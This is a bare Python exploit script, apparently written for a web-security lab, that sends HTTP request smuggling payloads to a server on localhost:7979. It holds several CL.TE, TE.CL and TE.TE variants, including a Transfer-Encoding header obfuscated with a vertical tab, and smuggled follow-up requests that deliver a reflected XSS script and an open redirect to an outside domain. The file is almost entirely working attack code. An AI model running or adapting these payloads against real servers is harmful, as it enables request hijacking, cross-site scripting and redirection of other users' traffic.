import socket, ssl
from time import sleep
from urllib.parse import urlparse

def send_payload(data):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 7979))
    s.send(data)

    sleep(1)

    data = s.recv(102400)
    s.close()
    
    return data

href = 'http://localhost:7979/'
host = urlparse(href).netloc

'''
# CL.TE vulnerability
smuggle_packet = 'POST / HTTP/1.1\r\n'
smuggle_packet += 'Host: {host}\r\n'.format(host=host)
smuggle_packet += 'Content-Length: 6\r\n'
smuggle_packet += 'Transfer-Encoding: chunked\r\n'
smuggle_packet += '\r\n'
smuggle_packet += '0\r\n'
smuggle_packet += '\r\n'
smuggle_packet += 'G'


# TE.CL vulnerability

second_packet = 'GPOST / HTTP/1.1\r\n'

smuggle_packet = 'POST / HTTP/1.1\r\n'
smuggle_packet += 'Host: {host}\r\n'.format(host=host)
smuggle_packet += 'Content-Length: 4\r\n'
smuggle_packet += 'Transfer-Encoding: chunked\r\n'
smuggle_packet += '\r\n'
smuggle_packet += '{:x}\r\n'.format(len(second_packet))
smuggle_packet += second_packet
smuggle_packet += '\r\n'
smuggle_packet += '0\r\n'
smuggle_packet += '\r\n'

# TE.TE vulnerability

#second_packet = 'GPOST / HTTP/1.1\r\n'
second_packet = 'GET /resources/js/labHeader.js HTTP/1.1\r\n'
second_packet += 'Content-Type: application/x-www-form-urlencoded\r\n'
second_packet += 'Content-Length: 15\r\n'
second_packet += '\r\n'
second_packet += 'x=1'

smuggle_packet = 'POST / HTTP/1.1\r\n'
smuggle_packet += 'Host: {host}\r\n'.format(host=host)
smuggle_packet += 'Content-Length: 4\r\n'
smuggle_packet += 'Transfer-Encoding: chunked\r\n'
smuggle_packet += 'Transfer-Encoding: cow\r\n\r\n'
smuggle_packet += '{:x}\r\n'.format(len(second_packet))
smuggle_packet += second_packet
smuggle_packet += '\r\n'
smuggle_packet += '0\r\n\r\n'
'''

# CL.TE
'''
smuggle_packet = b'POST / HTTP/1.1\r\n'
smuggle_packet += b'Host: localhost:7979\r\n'
smuggle_packet += b'Content-Length: 37\r\n'
smuggle_packet += b'Connection: keep-alive\r\n'
smuggle_packet += b'Transfer-Encoding: \x0bchunked\r\n\r\n'

smuggle_packet += b'1\r\n'
smuggle_packet += b'A\r\n'
smuggle_packet += b'0\r\n\r\n'

smuggle_packet += b'GET /x HTTP/1.1\r\n'
smuggle_packet += b'X-Foo: bar'
'''

# redirect 
'''
second_packet = b'GET /redirect?url=http://zairo.kr HTTP/1.1\r\n'
second_packet += b'X-Foo: bar'

smuggle_packet = b'POST / HTTP/1.1\r\n'
smuggle_packet += b'Host: localhost:7979\r\n'
smuggle_packet += b'Content-Length: ' + str(len(second_packet)+11).encode() + b'\r\n'
smuggle_packet += b'Connection: keep-alive\r\n'
smuggle_packet += b'Transfer-Encoding: \x0bchunked\r\n\r\n'

smuggle_packet += b'1\r\n'
smuggle_packet += b'A\r\n'
smuggle_packet += b'0\r\n\r\n'

smuggle_packet += second_packet
'''

# xss

second_packet = b'GET /xss?xss=<script>alert(1);</script> HTTP/1.1\r\n'
second_packet += b'X-Foo: bar'

smuggle_packet = b'POST / HTTP/1.1\r\n'
smuggle_packet += b'Host: localhost:7979\r\n'
smuggle_packet += b'Content-Length: ' + str(len(second_packet)+11).encode() + b'\r\n'
smuggle_packet += b'Connection: keep-alive\r\n'
smuggle_packet += b'Transfer-Encoding: \x0bchunked\r\n\r\n'

smuggle_packet += b'1\r\n'
smuggle_packet += b'A\r\n'
smuggle_packet += b'0\r\n\r\n'

smuggle_packet += second_packet


print(smuggle_packet.decode())

data = send_payload(smuggle_packet)
print(data.decode())